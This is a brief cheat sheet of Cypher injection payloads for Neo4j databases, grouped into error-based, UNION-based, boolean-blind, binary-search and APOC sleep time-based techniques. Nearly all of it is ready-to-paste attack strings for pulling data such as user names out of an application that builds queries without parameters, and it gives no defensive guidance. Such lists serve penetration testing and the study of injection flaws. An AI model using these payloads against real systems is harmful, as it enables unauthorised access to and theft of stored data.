# Neo4j

Neo4j uses Cypher query language, injection if not parameterized.

## Error-based
' + 1/0 -- to error.

## Union query-based
' UNION MATCH (u:User) RETURN u.name --

## Boolean-based blind
' WHERE LENGTH(n.name)>16 RETURN n --

Binary.

' WHERE ASCII(SUBSTRING(n.name,0,1))>109 --

## Time-based blind
If APOC library: ' CALL apoc.util.sleep(5000) --

Condition: if LENGTH(n.name)>16 CALL apoc.util.sleep(5000) 

Adapt for binary searches.
